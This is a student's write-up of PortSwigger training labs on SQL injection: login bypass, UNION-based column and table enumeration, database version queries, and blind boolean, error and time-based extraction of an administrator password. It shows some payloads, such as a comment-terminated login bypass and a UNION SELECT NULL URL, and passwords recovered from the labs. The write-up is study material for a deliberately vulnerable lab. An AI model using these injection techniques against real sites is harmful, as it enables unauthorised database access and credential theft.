                                                           **PORTSWIGGER LAB**
**Name : SURYA S NAIR**

**Roll Number : CB.EN.P2CYS22007**

PortSwigger offers tools for web application security, testing, & scanning.

**Lab #1 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

Goal : Retrieve the hidden data.

Web App is a shopping application is shown here.

![image](https://user-images.githubusercontent.com/123303806/234769271-9d9e63f6-691d-4299-bdaa-e311d2af7057.png)

Refine your search option is also there.

If we select  clothing,shoes and accessories from the category , we will get the below url .

![image](https://user-images.githubusercontent.com/123303806/234769430-2fdb0cad-5969-4ea3-9426-f95f29452a4d.png)

Category with the value set to accessories.     

![image](https://user-images.githubusercontent.com/123303806/234769567-d1345066-3568-4585-b3b7-2964b8d30712.png)

Select all the columns from the table of products where category =Accessories  AND released =1

To find hidden data , Set released to zero and to one so as to see the whole product.

![image](https://user-images.githubusercontent.com/123303806/234771554-cad7c658-513a-4990-8b87-ae05ac0c91d2.png)

Below the category is closed with no string inside.
 
![image](https://user-images.githubusercontent.com/123303806/234771502-d21a78ad-1d1c-4cec-9df2-eed47106fe85.png)

![image](https://user-images.githubusercontent.com/123303806/234771253-13f8d8bc-3ecc-48c8-9730-c4659265bc73.png)

The above will result in internal server error.

Category is not existing string.

![image](https://user-images.githubusercontent.com/123303806/234770492-d6aa6e1b-02d2-4195-b032-5fa8d32e31c3.png)

![image](https://user-images.githubusercontent.com/123303806/234770546-879d2fb4-8221-4070-8788-7616cea19e67.png)

Always evaluates to true.-- indicates everything indicates after this is a comment.

![image](https://user-images.githubusercontent.com/123303806/234770911-e6547b7a-8884-4423-b6e6-505f8c293cc5.png)

**Lab #2 SQL injection vulnerability allowing login bypass**

Goal: Perform SQL attack and login as the administrator user.

SELECT firstname FROM user where username='admin' and password='admin'

![image](https://user-images.githubusercontent.com/123303806/234772974-4a526d65-4490-4ce4-bcf1-c6abdb8b581d.png)

User name is admin and password is admin.

![image](https://user-images.githubusercontent.com/123303806/234773131-77ebd11c-3cbe-47c9-9988-411d3ecda3ca.png)

The above is a non verbal generic error.User name is  invalid means the attacker would be able to enumerate usernames on the system and that's a vulnerability on its own.

![image](https://user-images.githubusercontent.com/123303806/234773260-372fada9-0b31-4234-ba75-6f09b809c4c3.png)

SELECT firstname FROM user where username=''' and password='admin'

If I try to add sql character as username and type any password and try to login it will show internal server error.Which means something happened at the back end that broke the application.Thus its a good indication that this is vulnerable to sql injection.The reason behind this is because this quote character interferedwith the query.

![image](https://user-images.githubusercontent.com/123303806/234773400-150e5652-7f98-4e38-85e8-73139d1b5b78.png)


SELECT firstname FROM user where username='admin'--' and password='admin'
 
![image](https://user-images.githubusercontent.com/123303806/234773480-a955a0ad-fd67-40bd-bdda-80c8e6970e46.png)

![image](https://user-images.githubusercontent.com/123303806/234773528-acd5960c-5957-4f89-9ff9-4a8d03e53143.png)

Because the user is not the admin here.

SELECT firstname FROM user where username='adminstrator'--'  and password='admin'

![image](https://user-images.githubusercontent.com/123303806/234773642-7a4a86f8-8f7b-407b-bebb-e236b4daa24b.png)

![image](https://user-images.githubusercontent.com/123303806/234773699-3abd6512-c642-4388-9cf9-13eead7b1a47.png)

![image](https://user-images.githubusercontent.com/123303806/234773767-ca717dcc-c296-4496-819d-d2b11f7f6172.png)

**Lab #3 SQLi UNION attack determining the number of columns returned by the query*

Extract information from the backend database.

SQLi-Product category filter

The way we wanna exploit this filter or this category parameter is by running a SQL injection union attack.sql injection union attack to extract information from the backend database. Determine the number of columns that are being returned by the query that filters on category and once we are done stop that.

Union attack returns an additional row containing null values.

End Goal: Determine the number of columns returned by the query.

Background Knowledge : How Union operator works.

![image](https://user-images.githubusercontent.com/123303806/234774260-642c992a-b1dd-4d35-8c61-ed841aa68950.png)

Suppose for example there contains two tables  table1 and table2.

Table1 has two columns a b and table2 has two columns c d and it contains values as listed in figure.

Here the UNION operator is concatenates the results of the two queries into a single result set.

![WhatsApp Image 2023-04-27 at 11 52 25](https://user-images.githubusercontent.com/123303806/234776901-d9516c85-4f69-452a-ad31-5fc375014a35.jpg)

Give me not only products in product table but also give me usernames and passwords from the users table.That allow me to extarct information from other tables that are used by the backend database.

Rule :

*The number and the order of the columns must be same in all queries.
*The data types must be compatible.

![image](https://user-images.githubusercontent.com/123303806/234779054-bb3d792b-d590-492e-ab38-60963aee66e8.png)

![image](https://user-images.githubusercontent.com/123303806/234779128-891824a7-6603-43ce-922c-58dcc6619cab.png)

![image](https://user-images.githubusercontent.com/123303806/234779349-529c0bb9-d05e-4b2c-8e67-700d1b9c7bfe.png)

![image](https://user-images.githubusercontent.com/123303806/234779403-003da14c-ba51-444c-a4f7-355d0fc3978b.png)

This shows that thee isn't only one column in the query.

https://0ac100c404344948849e7ce60068005c.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27+UNION+SELECT+NULL,+NULL,NULL--

Add the above in the url as to solve the problem.

![image](https://user-images.githubusercontent.com/123303806/234789307-fc4ce8e8-ec92-4006-b685-35d8cba16cde.png)

**Lab #4 SQL injection UNION attack, finding a column containing text**

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so we can use a UNION attack to retrieve data from other tables. To construct such an attack, we first need to determine the number of columns returned by the query. 

![image](https://user-images.githubusercontent.com/123303806/234791042-2d47ae80-5b5b-4a66-8d2f-7a8fe27e93f3.png)

![image](https://user-images.githubusercontent.com/123303806/234791958-f1519ee2-411d-4bcf-94be-b6cdd7e084ea.png)

**Lab #5: SQL injection UNION attack, retrieving data from other tables**

![image](https://user-images.githubusercontent.com/123303806/234793237-ced2d6c1-b6ca-46c3-89e3-22a242627e55.png)

Everything from the table products where the category is set to accessories and released is set to 1.So if accessories followed by ' lead to internal server error.

![image](https://user-images.githubusercontent.com/123303806/234793355-1e47c500-a197-49ce-b8f3-9569d7b85b3d.png)

![image](https://user-images.githubusercontent.com/123303806/234793395-cf5cd486-dc63-42fe-bbe8-6eb99519ffc8.png)

![image](https://user-images.githubusercontent.com/123303806/234793469-6c374875-3599-408c-ae5d-08a91810bdbd.png)

![image](https://user-images.githubusercontent.com/123303806/234793488-f4c84dbc-d340-406b-8081-9163339ce0fa.png)

![image](https://user-images.githubusercontent.com/123303806/234793529-04e80bbd-4adb-4251-acff-61ba86d535e5.png)

![image](https://user-images.githubusercontent.com/123303806/234793576-b8379b05-83bb-4f9a-8346-f1b8164ba49a.png)

![image](https://user-images.githubusercontent.com/123303806/234793618-ded3b639-7c1c-4fdc-9b34-0536fe54bab0.png)

![image](https://user-images.githubusercontent.com/123303806/235070548-55d1fd42-ddb0-4847-a6b5-fc7d2124d02c.png)

![image](https://user-images.githubusercontent.com/123303806/235071054-f2d3d213-4cde-4e1d-a494-afbf469e94fb.png)

![image](https://user-images.githubusercontent.com/123303806/235071149-7889cc61-1a22-46b9-8a56-11bf962eecb4.png)

Firstly we saw a sql query that was used to return data in our case it was product data.we used single quote first thus its showing error that's a good indicator that it is vulnerable to sql injection.Then we used a union select query to query for null stringswhich basically represent every single possible character type that is used by a table and we started with one null string that didn't work so we realized that the original sql query is returning more than just one column we added another one we said null  null and we realized now it is working .So we had the correct numbers of columns that are returned by the original sql query and this is important otherwise the union attack payload is not going to workout.And then we substituted our null payloads with a number and a string just to realize what character the original column has if it's an integer ,if it's a string or something else.Now we knew that we went ahead and we were asking for username and password out of a different table called users because in this lab we knew that it actually existed in a real life application you would have to do some guesswork in order to find out if that table exists or not.Then we got the information out of the database and this is the way how we can extract interesting data from a sql database.

**Lab #6: SQL injection UNION attack, retrieving multiple values in a single column**

We will be using a union-based sql injection attack in order to retrieve multiple values in a single column .This lab contain sql injection vulnerability in the product category filter.The results from the query are returned in the applications responseso we can use a union attack to retrieve data from other tables.The database contains a different table called users with columns called username and password .To solve the lab perform a sql injection union attack that retrieves all the usernames and passwords and use the informationto login as the administrator  user.

Goal:Retrieve all usernames and password and login as the administrator  user.

![image](https://user-images.githubusercontent.com/123303806/235075863-29060c1f-7e14-4a50-9d40-db29621ee896.png)

![image](https://user-images.githubusercontent.com/123303806/235075937-4dda4147-7661-48a2-9d2e-775a81e090ba.png)

![image](https://user-images.githubusercontent.com/123303806/235076253-7292c3a2-455f-4c67-80e6-338cc6f0571d.png)

![image](https://user-images.githubusercontent.com/123303806/235076333-34469a82-003a-4f34-8715-8168ef5930b3.png)
 
Show no error which means that this column exists.

![image](https://user-images.githubusercontent.com/123303806/235076665-0a7316f4-17a2-4e7b-bfaf-d5186874e7d0.png)

Trying by column number 2 and it definitely exists.

![image](https://user-images.githubusercontent.com/123303806/235076929-2003ad62-596a-471d-af3b-f33dcba7b0c1.png)

Column number 3 results in internal server error.Column 3 doesn't exists.

![image](https://user-images.githubusercontent.com/123303806/235077560-91252b92-56a0-466b-b877-827be8af8819.png)

Internal server error means that the column does not accept data type text.

![image](https://user-images.githubusercontent.com/123303806/235078031-6a26da67-e813-4868-9195-4248fc4badd0.png)

![image](https://user-images.githubusercontent.com/123303806/235078101-5d51374c-6f33-4213-a411-bc8f4883b451.png)

![image](https://user-images.githubusercontent.com/123303806/235078384-a1d14c32-fc41-42c3-821d-9baf5b40dae1.png)

![image](https://user-images.githubusercontent.com/123303806/235078477-fb112db4-70d8-4ecd-97fb-7a5f82491835.png)

![image](https://user-images.githubusercontent.com/123303806/235078635-2fc7cc13-5d26-42b5-a7f4-ac8a3b6a5fb9.png)

![image](https://user-images.githubusercontent.com/123303806/235078704-291a7fdc-ba1c-4df1-b5d7-4c2ed90b5d46.png)

![image](https://user-images.githubusercontent.com/123303806/235079001-5b81f8a6-fa2c-472e-b78e-4fb411cfbc76.png)

![image](https://user-images.githubusercontent.com/123303806/235079063-dba3ec08-0314-40c7-b9d4-0502e424b8dd.png)

![image](https://user-images.githubusercontent.com/123303806/235079286-6eb8065d-7c70-48a9-98a2-b8e741369a8c.png)

![image](https://user-images.githubusercontent.com/123303806/235080360-010a07ed-4c70-404c-bbe9-8a0fba34b81c.png)

This will show the username and password.But I dont know where the username ends and wherevthe password begins.

![image](https://user-images.githubusercontent.com/123303806/235080889-d2a98c6c-48ef-4cb9-999b-1d29ce48fd82.png)

![image](https://user-images.githubusercontent.com/123303806/235081794-f608952e-55e6-4ac8-8709-c325d5f95869.png)

Enter the username upto the star and enter the password after the star.Then we tried to login its showing successful.

**Lab #7: SQL injection attack, querying the database type and version on Oracle**

We are going to use sql injection attack to query the type and version of the database that's running.

![image](https://user-images.githubusercontent.com/123303806/235084080-49ead8f3-8b6d-40e8-b5f0-4cb1dc021738.png)

![image](https://user-images.githubusercontent.com/123303806/235084141-7dd47881-6325-4ffb-be6d-9f430d31bb18.png)

![image](https://user-images.githubusercontent.com/123303806/235085523-c3030d06-1006-41ec-bc5c-fee2b808b25f.png)

**Lab #8: SQL injection attack, querying the database type and version on MySQL and Microsoft**

We will be using a union based sql injection attack to query the database type and version on mysql and microsoft databases.This lab contains sql injection  vulnerability in the product category filter.We can use union attack to retrieve the results from an injected query to solve the lab display the databse version string.

Goal : Display the database version.

So when I insert a sql character it will results in internal server error thus confirms this is vulnerable to sql injection.

![image](https://user-images.githubusercontent.com/123303806/235159053-b2ad7d85-1eea-4127-94b9-c68f7135f6d2.png)

i.Find the number of columns

![image](https://user-images.githubusercontent.com/123303806/235160044-d50e4524-3874-40d2-860a-860645bf3731.png)

![image](https://user-images.githubusercontent.com/123303806/235165596-7c7ab380-29ad-4a19-9309-4e448b0f0e91.png)

![image](https://user-images.githubusercontent.com/123303806/235166119-64f71486-f1bf-4594-91ce-098c78e0e577.png)

Results in internal server error.

![image](https://user-images.githubusercontent.com/123303806/235166800-0870912f-a95a-4959-ad3e-14bde08114c1.png)

Thus the internal server error was because of dash dash.

![image](https://user-images.githubusercontent.com/123303806/235167320-0b09969f-88eb-437e-9485-e4d37b0d1255.png)

![image](https://user-images.githubusercontent.com/123303806/235167533-766417d5-6e44-4d1e-946f-9bf63eccb01b.png)

The number of columns that the vulnerable query is using is 3 minus 1 which is equal to two.

ii.Figure out which columns contain text.

![image](https://user-images.githubusercontent.com/123303806/235168807-f20de354-bb03-4173-a021-ce8d922ab03c.png)

iii.Output the version

![image](https://user-images.githubusercontent.com/123303806/235169410-4cf580e9-718e-4017-866f-6759fb02b484.png)

![image](https://user-images.githubusercontent.com/123303806/235169645-2f981e6e-3b2b-4fe9-a3b7-91d5a98ed06f.png)

Thus it shows the version.

![image](https://user-images.githubusercontent.com/123303806/235169896-954720be-55cb-4add-a2e6-fc160b866f28.png)

**Lab #9: SQL injection attack, listing the database contents on non-Oracle databases**

Extract some information out of the database without brute forcing.

![image](https://user-images.githubusercontent.com/123303806/235173353-d5cfade6-77bc-49cd-a775-2143dd88733f.png)

To findout how many columns are returned by that initial query and we're getting an error that means one column is not enough .

![image](https://user-images.githubusercontent.com/123303806/235173780-fdfc8307-7dc5-4028-bc2f-ae73924b576c.png)

![image](https://user-images.githubusercontent.com/123303806/235173899-fb8ee958-c08d-47f9-8dc4-aabc77777e2e.png)

This results in successful answer that means this was correct so it's two columns that are returned by the initial query.

Now we're going to query table name and table name is a column that exists at all times in information schema table.

![image](https://user-images.githubusercontent.com/123303806/235174971-0fe4b9be-353c-4153-b39f-057c4005a421.png)

![image](https://user-images.githubusercontent.com/123303806/235175118-e1e9eb8f-6ca9-4149-9c2f-336a29a6bf0b.png)

We do see all the tables there's a myriad of tables.

![image](https://user-images.githubusercontent.com/123303806/235175660-888333ac-e88f-4808-a6a6-9e3ddc3aa8ce.png)

Now we can specify which table .where the table name equals the table name .

![image](https://user-images.githubusercontent.com/123303806/235203995-d35c0f16-b015-4ef0-bc6a-ae27b2773779.png)

![image](https://user-images.githubusercontent.com/123303806/235204092-e3754cf5-4682-402a-8c02-07cf580a6a44.png)

![image](https://user-images.githubusercontent.com/123303806/235204140-565ab217-90e1-47f3-8b04-60ceb4365907.png)

![image](https://user-images.githubusercontent.com/123303806/235204748-0e44e598-f30d-4176-b900-590f5f34ea9f.png)

![image](https://user-images.githubusercontent.com/123303806/235204899-065a26ab-7980-4013-ae16-14ebd901e85a.png)

![image](https://user-images.githubusercontent.com/123303806/235205159-c752b9ab-8e60-4385-889f-b9336d64dde1.png)

So we discovered a sql live vulnerability.We were using information schema tables which exists at all time .We can always use that to look at all the existing tables .We found an interesting one with our users table and now we did the exact same querying asking for the columnsin that table and we got our username and our password column name and now that we had the correct table name and correct column nameswe could just query with the unionselect queryfor the values we wantedand those werethe credentials of the administrator and we use this credential as we logged in and we solved the challenge.

**Lab #10: SQL injection attack, listing the database contents on Oracle**

We will be using a union-based sql injection attack to list the database content on oracle databases .This lab contains a sql injection vulnerability in the product category filter the result the query are returned in the aplication's response.So we can use a union attack to retrieve data from other tables the application has a login function and the database contains a table the usernames and passwords we need to determine the name of this table and the columns it contains then retrieve the contents of the table to obtain the username and password of all users and to solve the lab login as the administrator user.

Goal : 
i.Determine which table contains the usernames and passwords.
ii.Determine the column name in the table.
iii.Output the content of the table.
iv.Login as the administrator user.

![image](https://user-images.githubusercontent.com/123303806/235209446-6c4e7990-4bf6-4aac-9efa-da4a1e1ab4a0.png)

![image](https://user-images.githubusercontent.com/123303806/235210267-8a1427bf-9e4e-433c-a6e1-783f2999f84c.png)

Determine the number of columns:

![image](https://user-images.githubusercontent.com/123303806/235211009-03c353c5-3727-4d8a-9ad7-3edfaef05d65.png)

![image](https://user-images.githubusercontent.com/123303806/235211134-e02599db-6c26-456b-a26e-f97cb48985a6.png)

![image](https://user-images.githubusercontent.com/123303806/235211386-72bfc063-5c5a-433b-8884-1f742c6f721d.png)

So 2 columns.

Find data type of columns:

![image](https://user-images.githubusercontent.com/123303806/235212304-09f091e6-8e8d-44bb-8bb4-516ebb659875.png)

![image](https://user-images.githubusercontent.com/123303806/235212580-99f02300-b0c3-4ba7-9d5e-e322b3ff7324.png)

![image](https://user-images.githubusercontent.com/123303806/235212791-c4ee9b2e-3888-4609-8334-e6d446a4211b.png)

Output the list of tables in the database:

![image](https://user-images.githubusercontent.com/123303806/235213465-80a65270-35ee-42e6-8680-21790a49470c.png)

![image](https://user-images.githubusercontent.com/123303806/235214268-415d0815-43c1-4f42-a045-74e6a5fe81ab.png)

Output the column names of the users table :

![image](https://user-images.githubusercontent.com/123303806/235215014-65497589-5d0b-4515-ad5f-2803ac3dfa6a.png)

![image](https://user-images.githubusercontent.com/123303806/235215110-3a1a0c7e-ab43-4cb5-aacf-bf91678293d0.png)

Output the list of usernames/passwords

![image](https://user-images.githubusercontent.com/123303806/235216134-f8fecee2-ef5a-4826-a209-8429e60aa724.png)

![image](https://user-images.githubusercontent.com/123303806/235216237-a310815b-fa79-4dc4-baeb-ee1d937f2781.png)

![image](https://user-images.githubusercontent.com/123303806/235216383-aef6cb28-38bd-4283-a1cb-5bd856a4478d.png)

![image](https://user-images.githubusercontent.com/123303806/235216913-6100889c-b829-4016-91fa-f5d34998cd0c.png)

**Lab #11: Blind SQL injection with conditional responses**

We will be exploiting a blind based sql injection using conditional responses to list the content of the database.

This lab contains a blind sql injection vulnerability.The application uses a tracking cookie for analytics,and performs an sql query containing the value of the submitted cookie.

The results of the sql query are not returned,and no error messages are displayed.But the application includes a 'Welcome back' message in the page if the query returns any rows.

The database contains a different table called users,withcolumns acalled usernames and password.We need to exploit the blind sql injection vulnerability to find out the password of the administrator user.

To solve the lab,log in as administrator user.

Goals :

i.Enumerate the password of the administrator
ii.Log in as the administrator user.

![WhatsApp Image 2023-05-30 at 09 48 21](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/44be77eb-6631-4b28-8d48-c832b463ede5)

![WhatsApp Image 2023-05-30 at 09 48 50](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/afa79205-9495-4495-89de-211a8ba0bc03)

![WhatsApp Image 2023-05-30 at 09 49 25](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/0e568529-8150-45af-be21-513f82743b5a)

![WhatsApp Image 2023-05-30 at 09 50 45](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/57d02b4a-c274-4712-95fc-fb03ac73d1b2)

![WhatsApp Image 2023-05-30 at 09 52 44](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/a6457748-adb9-495e-b0af-9bd15b05f094)

![WhatsApp Image 2023-05-30 at 09 54 01](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/5a7ba1da-743e-4170-9c6b-72ce302a417b)

![WhatsApp Image 2023-05-30 at 09 57 54](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/a3947aa5-fb7d-4698-8007-861c047c8f38)

![WhatsApp Image 2023-05-30 at 10 02 44](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/ee379352-5511-442b-b0c9-74b81daefc37)

![WhatsApp Image 2023-05-30 at 10 04 50](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/32820bf8-c055-4744-88c9-3427982d05a1)

![WhatsApp Image 2023-05-30 at 10 05 38](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/39fe7bd4-2eb7-41c8-9db5-21b0f3835c58)

![WhatsApp Image 2023-05-30 at 10 06 40](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/b92b16bc-8e51-4a5a-9ad0-507ab7a876fc)

![WhatsApp Image 2023-05-30 at 10 07 17](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/064ae1f5-496e-4791-aec0-7cd32b43d2ea)

![WhatsApp Image 2023-05-30 at 10 08 02](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/c410093f-dddc-4408-bb52-4c4b0e275903)

![WhatsApp Image 2023-05-30 at 10 08 49](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/97e13ce9-9508-4456-bf4a-76376031fa0f)

![WhatsApp Image 2023-05-30 at 10 09 16](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/04bbdeeb-2e48-4283-a6f9-b9159bdeb6c8)

![WhatsApp Image 2023-05-30 at 10 09 58](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/07017940-5f92-4db2-abab-ca5a657b95b8)

![WhatsApp Image 2023-05-30 at 10 10 32](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/839b32a4-a8f5-4395-8a7a-e9d922e6b258)

![WhatsApp Image 2023-05-30 at 10 11 35](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/b7118d14-452e-4f8a-8d84-a27420e90560)

![WhatsApp Image 2023-05-30 at 10 12 13](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/4e8d6ed8-c27f-44dd-9cf0-4c616efcd357)

![WhatsApp Image 2023-05-30 at 10 12 38](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/e3443f82-ff94-43b5-89eb-4fc6b21fbde5)

![WhatsApp Image 2023-05-30 at 10 13 16](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/3a63300b-400f-40ab-9780-fa2c4adc3b98)

![WhatsApp Image 2023-05-30 at 10 13 52](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/9d0646ca-2514-47d1-8b9b-4ac4947b2b92)

![WhatsApp Image 2023-05-30 at 10 14 17](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/411dd159-5c94-4b47-8ebe-38ee32dd46b0)

![WhatsApp Image 2023-05-30 at 10 14 43](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/7548375b-d3b2-4492-93dd-d27c24ca9e51)

![WhatsApp Image 2023-05-30 at 10 15 11](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/dbb92027-8f8e-4268-8257-a1a1e8db3d71)

![WhatsApp Image 2023-05-30 at 10 15 40](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/70e4e8f5-f907-454d-a7e3-8b2e892713fd)

![WhatsApp Image 2023-05-30 at 10 16 13](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/3109734a-94c6-4626-afd1-19cc0aa3ddd9)

![WhatsApp Image 2023-05-30 at 10 20 08](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/b58b3fbf-c8d1-4f7e-ad50-cadec1fd3b40)

**Lab #12: Blind SQL injection with conditional errors**

This lab contains a blind sql injection vulnerability the application uses a tracking cookie for analytics and performs a sql query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

End Goals : 

i.Output the administrator password.
ii.Login as the administrator user.

Analysis : 
i.prove that parameter is vulnerable

![image](https://user-images.githubusercontent.com/123303806/236657511-6e79cb84-465e-4c6f-8586-36efed866b9e.png)

![image](https://user-images.githubusercontent.com/123303806/236657530-5cc25d1f-118a-4da2-9779-3443e08e802c.png)

![image](https://user-images.githubusercontent.com/123303806/236657558-af95ab4c-114b-4cd8-b3fb-5a1b321baaae.png)

![image](https://user-images.githubusercontent.com/123303806/236657592-d2cb1ab2-c91b-4974-bf53-dc259cdf4b72.png)

This shows that we are dealing with oracle database and this is very vulnerable to sql injection.To confirm vulnerability we give the name of a table that doesn't exist.

![image](https://user-images.githubusercontent.com/123303806/236657631-afecbb47-9c63-475f-a531-90c5d0da28f9.png)

ii.Confirm that the users table exist in the database.

![image](https://user-images.githubusercontent.com/123303806/236657710-61a5335a-cf8a-4427-bf9b-72c016fd9023.png)

![image](https://user-images.githubusercontent.com/123303806/236657759-40473ca5-fcda-48f1-a99e-069d4d1f4ca3.png)

The above figure results in 200 ok which means the users table exist.

iii.Confirm that the administrator user exists in the user database.

![image](https://user-images.githubusercontent.com/123303806/236657883-6ee7be54-697a-491e-8ddc-b2fa9f5f1fc8.png)

![image](https://user-images.githubusercontent.com/123303806/236657986-3ca0af68-334a-4152-b06a-ab4de6935542.png)

![image](https://user-images.githubusercontent.com/123303806/236658019-18376afa-2877-4642-b8fe-d878432036b7.png)

![image](https://user-images.githubusercontent.com/123303806/236658097-646636b4-fe3e-4606-b523-24dc3e864f0a.png)

Thus the administrator user exist.

![image](https://user-images.githubusercontent.com/123303806/236658164-47112e9c-d088-491a-82a9-621ac942838b.png)

This means that the user doesnot exist in database.

iv.Determine length of password.

![image](https://user-images.githubusercontent.com/123303806/236658252-27de6302-651f-4446-b267-38cbc2cdc819.png)

![image](https://user-images.githubusercontent.com/123303806/236658277-1a0ce561-df0d-4d31-bbe4-655f4df97632.png)

Which means length of password is less than 50.

![image](https://user-images.githubusercontent.com/123303806/236658445-15dbee12-4c50-4e7b-b48d-1e1363cb439d.png)

V.Output the administrator password

![image](https://user-images.githubusercontent.com/123303806/236658585-138d6f3e-9d09-4633-bf6c-0168a763c5be.png)

This means a is not the first character of the password.

![image](https://user-images.githubusercontent.com/123303806/236658646-63e54c16-406b-45b4-90c7-a5681380afd4.png)

![image](https://user-images.githubusercontent.com/123303806/236658675-8cec88ef-e2be-4f56-b0d7-454534fef43d.png)

Which means the first characater is t.

![image](https://user-images.githubusercontent.com/123303806/236658853-a0821405-92d8-4c07-929f-8b255f5c1296.png)

![image](https://user-images.githubusercontent.com/123303806/236660340-77a86c0d-74bb-46f6-bbfc-87f82080f0a1.png)

![image](https://user-images.githubusercontent.com/123303806/236660357-c303e8b8-edb2-443d-91c4-708028bae7c4.png)

Username = administrator 
password = tlxrz9r14m0uproqd9xv

![image](https://user-images.githubusercontent.com/123303806/236660830-4adcd85d-4bb0-4a9b-ab6b-303a345e08a4.png)

**Lab #14: Blind SQL injection with time delays**

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

Vulnerability parameter- tracking cookie

End Goal : To prove that the field is vulnerable to blind sqli(time based)

![WhatsApp Image 2023-05-31 at 09 50 30](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/d13b28a6-3075-4dc2-995d-2370a777308e)

![WhatsApp Image 2023-05-31 at 09 54 48](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/7b39e6ba-70e8-4214-9e7a-10eec9c35ac7)

![WhatsApp Image 2023-05-31 at 09 55 40](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/b6199876-c0d6-455d-9d47-2eaebaa42cc1)

![WhatsApp Image 2023-05-31 at 10 03 28](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/662072ac-4685-46e9-92dd-e9f0c9ce2c48)

![WhatsApp Image 2023-05-31 at 10 04 46](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/eee91b00-a3b4-4f6c-a173-eeba60976120)

![WhatsApp Image 2023-05-31 at 10 06 03](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/84d6128b-e1bb-4fc5-ac16-11360cbbed0b)

**Lab #15: Blind SQL injection with time delays and information retrieval**

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

Vulnerable parameter - tracking cookie.

End Goal : 

i.Exploit the time-based blind SQLi to output the administrator password.
ii.Login as the asdministrator user.

Analysis :

i.Confirm that the parameter is vulnerable to SQLi.

![image](https://user-images.githubusercontent.com/123303806/236668730-7f41514d-c28e-4c02-9d12-0a9866458356.png)

ii.Confirm that the users table exists on the database

![image](https://user-images.githubusercontent.com/123303806/236668894-54c19dfd-e27c-4f17-8c8b-a5ab484ff279.png)

![image](https://user-images.githubusercontent.com/123303806/236669098-164a7b6f-17ab-4c43-a3ff-1e0e1ec1a90b.png)

iii.Enumerate password length

![image](https://user-images.githubusercontent.com/123303806/236669240-d9393854-09f1-4170-8e96-1ba6b6afdf07.png)

![image](https://user-images.githubusercontent.com/123303806/236669282-02c49744-b075-49fe-96c8-300d14dc6ff7.png)

Thus password length is bigger than 1 but lesser than 25.

![image](https://user-images.githubusercontent.com/123303806/236669988-dcee2783-9fc5-4d86-a2a0-a77c4143f5ad.png)

Length of password is 20 characters.

iv.Enumerate the administrator password.

![image](https://user-images.githubusercontent.com/123303806/236670164-1bb587e5-680e-4d3b-a671-2d724d7cb6f3.png)

So a is not the first character of the password.

![image](https://user-images.githubusercontent.com/123303806/236670428-d91a8732-3556-4e4f-99aa-f3db0d063468.png)

![image](https://user-images.githubusercontent.com/123303806/236683492-22e15b4d-9539-409c-9b7a-2110900e3f83.png)

![image](https://user-images.githubusercontent.com/123303806/236683522-1dbc9b99-74f7-401d-bb64-5b7f7ecb5164.png)

**Lab #16: Blind SQL injection with time delays and information retrieval**

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/dcf7040b-3942-4d38-8514-723aaeb9d2e7)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/995dbd16-10a2-481d-b404-50af5d46ddf4)

![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/69ad3c39-7306-488d-b365-5b88a05e400a)

![Uploading image.png…]()

username : administrator 
password : uq0k0oca9y9s2l2off6e

**Lab #13 : Visible error-based SQL injection**

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

